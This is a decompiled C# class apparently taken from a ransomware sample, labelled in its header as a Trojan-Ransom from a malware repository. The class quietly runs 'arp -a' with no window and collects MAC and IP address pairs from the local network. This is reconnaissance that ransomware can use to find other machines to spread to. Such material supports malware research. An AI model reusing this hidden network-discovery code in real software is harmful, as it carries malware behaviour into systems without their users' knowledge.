// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.VJsusgqzfWSrbMi
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace MufMaOSvGyvz
{
  public class VJsusgqzfWSrbMi
  {
    private string MIVThsKTpvf = string.Empty;
    private string \u003CMacAddress\u003Ek__BackingField;
    private string \u003CIPAddress\u003Ek__BackingField;
    private static Func<string, bool> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate4;

    public VJsusgqzfWSrbMi(string string_0, string string_1)
    {
      this.MacAddress = string_0;
      this.IPAddress = string_1;
    }

    public string MacAddress
    {
      get => this.\u003CMacAddress\u003Ek__BackingField;
      private set => this.\u003CMacAddress\u003Ek__BackingField = value;
    }

    public string IPAddress
    {
      get => this.\u003CIPAddress\u003Ek__BackingField;
      private set => this.\u003CIPAddress\u003Ek__BackingField = value;
    }

    public static List<VJsusgqzfWSrbMi> waPssoquJEsup()
    {
      try
      {
        List<VJsusgqzfWSrbMi> vjsusgqzfWsrbMiList = new List<VJsusgqzfWSrbMi>();
        string str1 = VJsusgqzfWSrbMi.DlYLhXnJueaptK();
        char[] chArray = new char[2]{ '\n', '\r' };
        foreach (string str2 in str1.Split(chArray))
        {
          if (!string.IsNullOrEmpty(str2))
          {
            string[] source = str2.Split(' ', '\t');
            if (VJsusgqzfWSrbMi.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate4 == null)
              VJsusgqzfWSrbMi.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate4 = new Func<string, bool>(VJsusgqzfWSrbMi.\u003CGetIPInfo\u003Eb__3);
            Func<string, bool> anonymousMethodDelegate4 = VJsusgqzfWSrbMi.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate4;
            string[] array = ((IEnumerable<string>) source).Where<string>(anonymousMethodDelegate4).ToArray<string>();
            if (array.Length == 3)
              vjsusgqzfWsrbMiList.Add(new VJsusgqzfWSrbMi(array[1], array[0]));
          }
        }
        return vjsusgqzfWsrbMiList;
      }
      catch (Exception ex)
      {
        throw new Exception("IPInfo: Error Parsing 'arp -a' results", ex);
      }
    }

    private static string DlYLhXnJueaptK()
    {
      Process process = (Process) null;
      string str = string.Empty;
      try
      {
        process = Process.Start(new ProcessStartInfo("arp", "-a")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          RedirectStandardOutput = true
        });
        str = process.StandardOutput.ReadToEnd();
        process.Close();
      }
      catch (Exception ex)
      {
        throw new Exception("IPInfo: Error Retrieving 'arp -a' Results", ex);
      }
      finally
      {
        process?.Close();
      }
      return str;
    }

    private static bool \u003CGetIPInfo\u003Eb__3(string string_0) => !string.IsNullOrEmpty(string_0);
  }
}
